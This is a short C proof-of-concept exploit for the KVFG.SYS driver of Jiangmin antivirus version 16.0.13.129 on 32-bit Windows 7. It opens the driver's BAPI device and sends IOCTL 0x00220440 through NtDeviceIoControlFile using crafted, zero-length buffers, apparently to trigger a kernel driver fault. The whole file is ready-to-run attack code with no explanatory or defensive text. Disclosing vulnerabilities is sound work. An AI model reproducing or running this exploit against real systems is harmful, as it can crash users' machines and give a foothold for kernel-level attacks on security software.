//Experimental environment: win7 x32
//Software official website:http://www.jiangmin.com/
//Software download address:http://www.jiangmin.com/PC/207.html
//Software version：16.0.13.129
//Affected Component: KVFG.SYS
//poc
#include<stdio.h>
#include <windows.h>
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef NTSTATUS(NTAPI* NtDeviceIoControlFile)(
        HANDLE           FileHandle,
        HANDLE           Event,
        PVOID            ApcRoutine,
        PVOID            ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        ULONG            IoControlCode,
        PVOID            InputBuffer,
        ULONG            InputBufferLength,
        PVOID            OutputBuffer,
        ULONG            OutputBufferLength
  );
int main() {
    HANDLE hDriver = CreateFileA("\\\\.\\BAPI", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    ULONG dw;
    if (hDriver == INVALID_HANDLE_VALUE) {
        system("pause");
        return(-1);
    } 
    LPCWSTR nt = L"ntdll";
    HMODULE hntdll = GetModuleHandle(nt);
    IO_STATUS_BLOCK p = {};
    NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, "NtDeviceIoControlFile");
    if (!tDeviceIoControl) {
        printf("[-] Fail to resolve ZwDeviceIoControlFile(0x%X)\n", GetLastError());
        system("pause");
    }   
    LPVOID lpFakeBuffer = malloc(0x20000);
    memset(lpFakeBuffer, 0, 0x20000);
    LPVOID Address = malloc(0x20000);
    memset(Address, 0, 0x20000);  
    tDeviceIoControl(hDriver, 0, 0, 0, &p, 0x00220440, lpFakeBuffer, 0, (PVOID)Address, 0);
    return 0;
}
